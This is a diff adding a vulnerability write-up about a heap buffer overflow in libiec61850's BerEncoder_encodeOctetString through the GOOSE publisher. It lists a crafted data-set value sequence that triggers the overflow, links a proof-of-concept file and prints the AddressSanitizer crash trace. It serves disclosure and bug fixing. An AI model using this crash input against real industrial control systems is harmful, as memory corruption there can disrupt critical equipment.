@@ -370,3 +370,260 @@ Abort trap: 6
 
 
 
+#Another heap buffer overflow in function BerEncoder_encodeOctetString
+
+This issue seems to be similiar to [this issue](https://github.com/fouzhe/security/tree/master/libiec61850#heap-buffer-overflow-in-function-berencoder_encodeoctetstring) which is reported several days ago. Although this bug has been fixed, there is  **another specific dataSetValue sequence** which can cause heap buffer overflow in another trace. 
+
+The following is the special sequence and the complete version of `goose_publisher_example.c` that triggers `heap buffer overflow` is [here](https://github.com/fouzhe/security/blob/master/libiec61850/goose_publisher_example_2.c).
+
+```C
+int j=0;
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<28;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<5;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<5;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(1));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(0));
+for(j=0;j<5;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<7;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<4;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(1));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(0));
+for(j=0;j<4;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<3;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+for(j=0;j<1;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(false));
+for(j=0;j<2;j++)
+LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
+```
+
+
+
+Here is the ASAN information:
+
+```shell
+=================================================================
+==13400==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61b00001f76e at pc 0x00000045624c bp 0x7fff45a10840 sp 0x7fff45a10830
+WRITE of size 1 at 0x61b00001f76e thread T0
+    #0 0x45624b in BerEncoder_encodeOctetString src/mms/asn1/ber_encoder.c:122
+    #1 0x4477f3 in createGoosePayload src/goose/goose_publisher.c:347
+    #2 0x4477f3 in GoosePublisher_publish src/goose/goose_publisher.c:362
+    #3 0x402baf in main /home/fouzhe/my_fuzz/libiec61850/examples/goose_publisher/goose_publisher_example.c:253
+    #4 0x7fc57f71782f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
+    #5 0x4032c8 in _start (/home/fouzhe/my_fuzz/libiec61850/examples/goose_publisher/goose_publisher_example+0x4032c8)
+
+0x61b00001f76e is located 0 bytes to the right of 1518-byte region [0x61b00001f180,0x61b00001f76e)
+allocated by thread T0 here:
+    #0 0x7fc57fd76602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
+    #1 0x44b610 in Memory_malloc hal/memory/lib_memory.c:47
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow src/mms/asn1/ber_encoder.c:122 BerEncoder_encodeOctetString
+Shadow bytes around the buggy address:
+  0x0c367fffbe90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c367fffbea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c367fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c367fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c367fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0c367fffbee0: 00 00 00 00 00 00 00 00 00 00 00 00 00[06]fa fa
+  0x0c367fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c367fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c367fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c367fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c367fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+==13400==ABORTING
+```
+
